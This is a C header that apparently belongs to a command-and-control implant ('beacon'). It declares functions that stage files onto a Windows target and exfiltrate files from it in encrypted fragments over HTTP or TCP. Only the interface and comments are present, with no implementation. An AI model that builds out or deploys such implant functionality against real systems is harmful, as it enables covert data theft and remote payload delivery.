#pragma once
#include <stdint.h>
#include <windows.h>

/* handle_file_stage: receives one FileStage fragment (Type=3).
   Fragment 0 carries [uint16 dest_path_len][dest_path_bytes][chunk_bytes].
   Subsequent fragments carry only [chunk_bytes].
   Writes bytes to the destination file as fragments arrive.
   File is finalized and slot freed when flags & FLAG_LAST_FRAG. */
void handle_file_stage(uint32_t beacon_id, uint32_t label,
                       uint32_t identifier, uint16_t flags,
                       const uint8_t *data, uint32_t len,
                       const uint8_t session_key[32],
                       SOCKET tcp_sock);

/* handle_file_exfil: reads src_path on the target, sends contents as
   fragmented Type=4 results. Fragment 0 carries
   [uint16 basename_len][basename_bytes][chunk_bytes]; others carry
   only [chunk_bytes]. Uses HTTP POST or TCP envelope (session mode). */
void handle_file_exfil(uint32_t beacon_id, uint32_t label,
                       const char *src_path,
                       const uint8_t session_key[32],
                       SOCKET tcp_sock);
